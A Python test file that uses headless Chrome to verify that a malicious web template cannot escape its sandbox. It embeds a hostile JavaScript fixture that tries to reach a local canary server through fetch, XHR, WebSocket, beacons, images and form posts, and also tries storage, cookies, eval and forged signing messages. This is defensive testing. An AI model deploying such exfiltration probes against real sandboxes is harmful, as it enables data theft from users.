"""Real-browser checks (headless Chrome): a malicious, registry-approved template running in
the sandbox can't reach the network, the core API, keys or storage, and can't sign; the HTML
viewer page loads nothing remote.  Skipped when Chrome isn't installed."""
import json, os, re, shutil, subprocess, tempfile, threading, time, unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from helpers import F
from typed import testbed as T, registry as R
from typed.core import Core, serve as core_serve

CHROME = shutil.which("google-chrome") or shutil.which("chromium")
TPL = Path(__file__).resolve().parent.parent / "typed" / "templates"

MALICIOUS = r"""
"use strict";
const C = "__CANARY__", out = {};
async function tryit(name, fn) { try { const r = await Promise.race([Promise.resolve().then(fn), new Promise((_, no) => setTimeout(() => no({name: "timeout-no-response"}), 700))]); out[name] = "ALLOWED " + String(r).slice(0, 60); } catch (e) { out[name] = "blocked: " + (e && e.name); } parent.postMessage({type: "report", data: {[name]: out[name]}}, "*"); }
let got = null;
function reportView(v) {
  try {
    const view = (v && v.view) || {};
    const lines = view.lines || [];
    const first = (lines[0] || {}).text || "";
    const j = JSON.stringify(v);
    out.view_received = "lines=" + lines.length + " first=" + first + " privkey_in_view=" + /author\.key|seed|priv/.test(j);
  } catch (e) { out.view_received = "err:" + (e && e.name); }
  parent.postMessage({type: "report", data: {view_received: out.view_received}}, "*");
}
window.addEventListener("message", (ev) => { if (ev.data && ev.data.type === "view" && !got) { got = ev.data.data; reportView(got); } });
parent.postMessage({type: "ready"}, "*");
parent.postMessage({type: "report", data: {started: "yes"}}, "*");
(async () => {
  const T = [];
  T.push(tryit("fetch_core_api", () => fetch("/api/collections").then(r => r.status)));
  T.push(tryit("fetch_core_api_hdr", () => fetch("/api/collections", {headers: {"X-Core": "1"}}).then(r => r.status)));
  T.push(tryit("fetch_canary", () => fetch(C + "/fetch").then(r => r.status)));
  T.push(tryit("fetch_host", () => fetch("__HUB__/c/lobby/v1/log").then(r => r.status)));
  T.push(tryit("xhr", () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.onload = () => ok(x.status); x.onerror = () => no(new Error("NetworkError")); x.open("GET", C + "/xhr"); x.send(); })));
  T.push(tryit("websocket", () => new Promise((ok, no) => { const w = new WebSocket(C.replace("http", "ws") + "/ws"); w.onopen = () => ok("open"); w.onerror = () => no(new Error("WSError")); })));
  T.push(tryit("beacon", () => { const r = navigator.sendBeacon(C + "/beacon", "x"); if (!r) throw new Error("refused"); return r; }));
  T.push(tryit("image", () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok("loaded"); i.onerror = () => no(new Error("ImgError")); i.src = C + "/img"; })));
  T.push(tryit("eventsource", () => new Promise((ok, no) => { const s = new EventSource(C + "/es"); s.onopen = () => ok("open"); s.onerror = () => no(new Error("ESError")); })));
  T.push(tryit("worker", () => new Promise((ok, no) => { try { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"]))); w.onmessage = () => ok("ran"); w.onerror = () => no(new Error("WorkerError")); } catch (e) { no(e); } })));
  T.push(tryit("parent_dom", () => parent.document.title));
  T.push(tryit("localStorage", () => { localStorage.setItem("k", "v"); return localStorage.getItem("k"); }));
  T.push(tryit("indexedDB", () => new Promise((ok, no) => { const r = indexedDB.open("x"); r.onsuccess = () => ok("opened"); r.onerror = () => no(r.error); })));
  T.push(tryit("cookie", () => { document.cookie = "a=b"; if (!document.cookie) throw new Error("none"); return document.cookie; }));
  T.push(tryit("window_open", () => { const w = window.open(C + "/popup"); if (!w) throw new Error("null"); return "opened"; }));
  T.push(tryit("eval", () => eval("1+1")));
  T.push(tryit("inline_script", () => { window.__x = 0; const s = document.createElement("script"); s.textContent = "window.__x=1"; document.body.appendChild(s); if (!window.__x) throw new Error("CSP"); return "ran"; }));
  T.push(tryit("form_post", () => { const f = document.createElement("form"); f.action = C + "/form"; f.method = "post"; document.body.appendChild(f); f.submit(); return "submitted?"; }));
  T.push(tryit("forged_confirm", () => { parent.postMessage({type: "confirm", token: "x"}, "*"); parent.postMessage({type: "sign", body: {}}, "*"); return "sent (should be ignored)"; }));
  T.push(tryit("forged_draft_bad_type", () => { parent.postMessage({type: "draft", t: "shop.listing", body: {title: "x"}}, "*"); return "sent (core must refuse)"; }));
  await Promise.all(T);
  parent.postMessage({type: "draft", t: "room.msg", body: {text: "drafted by template"}, refs: []}, "*");
  if (!out.view_received) out.view_received = got ? "late" : "none";
  parent.postMessage({type: "report", data: out}, "*");
  try { top.location = C + "/top"; } catch (e) {}
  try { location.href = C + "/navigate"; } catch (e) {}
})();
"""


class Canary:
    def __init__(self):
        self.hits = []
        me = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def _hit(self):
                me.hits.append(self.path)
                self.send_response(200); self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
            do_GET = do_POST = _hit
        self.srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.srv.server_address[1]}"


def chrome_dom(url, budget=30000):
    prof = tempfile.mkdtemp(prefix="chrome-")
    r = subprocess.run([CHROME, "--headless=new", "--no-sandbox", "--disable-gpu", "--no-first-run",
                        f"--user-data-dir={prof}", "--dump-dom", f"--virtual-time-budget={budget}", url],
                       capture_output=True, text=True, timeout=90)
    return r.stdout


@unittest.skipUnless(CHROME, "Chrome not installed")
class Browser(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.env = T.start(mirror=False)
        cls.canary = Canary()
        # test registry: re-sign the shipped bundles, then approve a malicious "room" 9.0.0
        cls.rk = F.new_key()
        entries = [R.sign_entry(cls.rk, n, "1.0.0", [], R.read_dir(TPL / n))
                   for n in ("board", "room", "wiki", "profile", "shop", "drop", "exit", "card")]
        cfg = T.client_config(cls.env)
        cfg["registry"] = {"pin": F.pub_hex(cls.rk), "entries": entries}
        cls.dir = Path(tempfile.mkdtemp())
        cls.core = Core(cls.dir, cfg, autoconfirm=False)
        mal = dict(R.read_dir(TPL / "room"))
        mal["app.js"] = MALICIOUS.replace("__CANARY__", cls.canary.url).replace("__HUB__", cls.env["hub_url"]).encode()
        e = R.sign_entry(cls.rk, "room", "9.0.0", [], mal)
        cls.core.templates.offer(e, mal)
        cls.core.templates.approve("room", "9.0.0")
        # one verified line in the room, by someone else
        other = T.new_core(cls.env, "other")
        other.sync(); other.draft("lobby", "room.msg", {"text": "verified hello"}, [])
        cls.core.sync()
        cls.srv = core_serve(cls.core, test_mode=True, sync_every=0)
        cls.base = f"http://127.0.0.1:{cls.srv.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        T.stop(cls.env)

    def test_malicious_template_is_contained(self):
        # headless virtual time can end before the async view push lands; retry the page load
        for attempt in range(4):
            dom = chrome_dom(self.base + "/?c=lobby")
            m = re.search(r'<pre id="report"[^>]*>(.*?)</pre>', dom, re.S)
            self.assertTrue(m, dom[-2000:])
            rep = {}
            for line in m.group(1).strip().splitlines():
                rep.update(json.loads(line.replace("&quot;", '"').replace("&amp;", "&")))
            # also wait for the template's valid draft to reach the core's sheet (slow runners)
            if "fetch_core_api" in rep and "verified hello" in rep.get("view_received", "") \
                    and "Sign and post?" in dom:
                break
        # beacon/form only report "queued"; whether anything left is decided by the canary below
        allowed = {k: v for k, v in rep.items() if v.startswith("ALLOWED")
                   and k not in ("forged_confirm", "forged_draft_bad_type", "beacon", "form_post")}
        for must in ("fetch_core_api", "fetch_core_api_hdr", "fetch_canary", "fetch_host", "xhr",
                     "websocket", "image", "eventsource", "worker", "parent_dom", "localStorage",
                     "indexedDB", "cookie", "window_open", "eval"):
            self.assertTrue(rep.get(must, "").startswith("blocked"), (must, rep.get(must)))
        self.assertEqual(allowed, {}, rep)
        self.assertIn("first=verified hello", rep.get("view_received", ""), rep)
        self.assertIn("privkey_in_view=false", rep["view_received"])
        time.sleep(1)
        self.assertEqual(self.canary.hits, [], "template reached the network")
        # the template's valid draft waits in the core's sheet; nothing was signed
        self.assertIn("Sign and post?", dom)
        self.assertIn("drafted by template", dom)
        n = self.core.colls["lobby"].store.db.execute(
            "SELECT COUNT(*) FROM log WHERE author=?", (self.core.me,)).fetchone()[0]
        self.assertEqual(n, 0)

    def test_core_api_refuses_without_shell_header(self):
        import urllib.request, urllib.error
        for path in ("/api/collections", "/api/view/lobby"):
            with self.assertRaises(urllib.error.HTTPError) as cm:
                urllib.request.urlopen(self.base + path)
            self.assertEqual(cm.exception.code, 403)

    def test_frame_csp(self):
        import urllib.request
        r = urllib.request.urlopen(self.base + "/frame/room")
        csp = r.headers["Content-Security-Policy"]
        for d in ("connect-src 'none'", "img-src 'none'", "sandbox allow-scripts", "worker-src 'none'"):
            self.assertIn(d, csp)
        self.assertNotIn("unsafe-inline", csp); self.assertNotIn("unsafe-eval", csp)

    def test_html_viewer_loads_nothing_remote(self):
        site = self.env["tmp"] / "site" / "index.html"
        site.write_text(T.HOSTILE_HTML.replace("http://canary", self.canary.url))
        before = len(self.canary.hits)
        dom = chrome_dom(self.base + "/viewer?name=demo.sesh/index.html", 4000)
        self.assertIn("Untyped site · demo.sesh · not verified content", dom)
        self.assertIn("Plain page", dom)
        for bad in ("<script", "onload", "<iframe", "<img", "<form", "<object"):
            self.assertNotIn(bad, dom.lower())
        time.sleep(0.5)
        self.assertEqual(self.canary.hits[before:], [])


if __name__ == "__main__":
    unittest.main()
